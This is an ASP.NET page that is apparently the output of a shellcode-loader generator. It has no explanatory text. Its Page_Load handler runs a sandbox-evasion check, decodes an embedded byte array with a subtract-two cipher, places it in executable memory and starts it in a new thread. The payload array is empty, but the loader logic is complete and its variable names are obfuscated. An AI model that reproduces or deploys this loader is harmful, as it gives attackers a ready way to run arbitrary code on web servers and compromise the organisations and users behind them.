<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    private static Int32 MEM_COMMIT=0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    protected void Page_Load(object sender, EventArgs e)
    {
        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4,0);
        if (mem == null)
        {
            return;
        }

        byte[] y4h1xg1xFwm9 = new byte[48764] {};
        for(int i = 0; i < y4h1xg1xFwm9.Length; i++)
        {
            y4h1xg1xFwm9[i] = (byte)(((uint)y4h1xg1xFwm9[i] - 2) & 0xFF);
        }
        ;

        IntPtr ijIZE = VirtualAlloc(IntPtr.Zero,(UIntPtr)y4h1xg1xFwm9.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(y4h1xg1xFwm9,0,ijIZE,y4h1xg1xFwm9.Length);
        IntPtr qUIzXk = IntPtr.Zero;
        IntPtr zIRjC77yg = CreateThread(IntPtr.Zero,UIntPtr.Zero,ijIZE,IntPtr.Zero,0,ref qUIzXk);
    }
</script>
